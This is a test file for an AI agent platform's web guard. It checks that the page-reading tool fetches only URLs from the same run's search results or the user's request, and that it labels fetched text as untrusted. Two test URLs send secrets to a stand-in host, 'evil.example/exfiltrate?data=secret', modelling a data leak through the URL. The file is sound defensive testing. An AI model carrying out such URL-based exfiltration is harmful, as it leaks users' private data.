// @vitest-environment node
import { beforeEach, describe, expect, it, vi } from "vitest";
import { prisma } from "@/lib/db";
import { assertTestDatabase } from "@/test/db-guard";
import { getTool } from "./tools";
import { urlWasProvided } from "./web-guard";

const fetchMock = vi.fn<typeof fetch>();

async function makeRun(objective: string) {
  const agent = await prisma.agent.create({ data: { name: `Web test ${Math.random()}`, instructions: "x", tools: ["web_search", "read_webpage"], approvalTools: [] } });
  return prisma.agentRun.create({ data: { agentId: agent.id, objective, budgetUsd: 0.1 } });
}

beforeEach(async () => {
  assertTestDatabase();
  await prisma.agentRun.deleteMany();
  await prisma.agent.deleteMany({ where: { builtInKey: null } });
  fetchMock.mockReset();
  fetchMock.mockImplementation(async () => new Response(`<html><head><title>Page</title></head><body><article><p>${"A readable sentence about solar power. ".repeat(10)}</p></article></body></html>`, { headers: { "Content-Type": "text/html" } }));
  vi.stubGlobal("fetch", fetchMock);
});

describe("agents opening web pages (database)", () => {
  it("only opens addresses a search returned in the same run, or that the user wrote", async () => {
    const run = await makeRun("Summarize https://8.8.4.4/user-supplied for me.");
    await prisma.agentStep.create({ data: { runId: run.id, index: 0, kind: "action", tool: "web_search", status: "ok", output: JSON.stringify({ results: [{ title: "T", url: "https://8.8.8.8/found?utm_source=x", snippet: "s" }] }) } });
    expect(await urlWasProvided("https://8.8.8.8/found", run.id)).toBe(true);
    expect(await urlWasProvided("https://8.8.4.4/user-supplied", run.id)).toBe(true);
    expect(await urlWasProvided("https://evil.example/?q=my-secret-notes", run.id)).toBe(false);
    expect(await urlWasProvided("not a url", run.id)).toBe(false);

    const other = await makeRun("something else");
    expect(await urlWasProvided("https://8.8.8.8/found", other.id)).toBe(false);
  });

  it("the read_webpage tool refuses unsolicited addresses, without making a request", async () => {
    const run = await makeRun("Research solar power");
    const tool = getTool("read_webpage")!;
    await expect(tool.run({ url: "https://evil.example/exfiltrate?data=secret" } as never, { runId: run.id, depth: 0 })).rejects.toThrow(/didn't come from a web_search result/);
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it("reads a page that came from search, and labels the text as untrusted", async () => {
    const run = await makeRun("Research solar power");
    await prisma.agentStep.create({ data: { runId: run.id, index: 0, kind: "action", tool: "web_search", status: "ok", output: JSON.stringify({ results: [{ url: "https://8.8.8.8/solar" }] }) } });
    const result = (await getTool("read_webpage")!.run({ url: "https://8.8.8.8/solar" } as never, { runId: run.id, depth: 0 })) as { note: string; text: string; title: string };
    expect(result.title).toBe("Page");
    expect(result.text).toContain("solar power");
    expect(result.note).toMatch(/not instructions/);
  });

  it("is a read tool, so no approval is needed, and the built-in Research Agent can use it", async () => {
    expect(getTool("web_search")!.risk).toBe("read");
    expect(getTool("read_webpage")!.risk).toBe("read");
    const { BUILT_IN_AGENTS } = await import("./builtins");
    const research = BUILT_IN_AGENTS.find((agent) => agent.key === "research-agent")!;
    expect(research.tools).toEqual(expect.arrayContaining(["web_search", "read_webpage"]));
    expect(research.tools.filter((name) => getTool(name)?.risk === "write")).toEqual([]);
  });
});
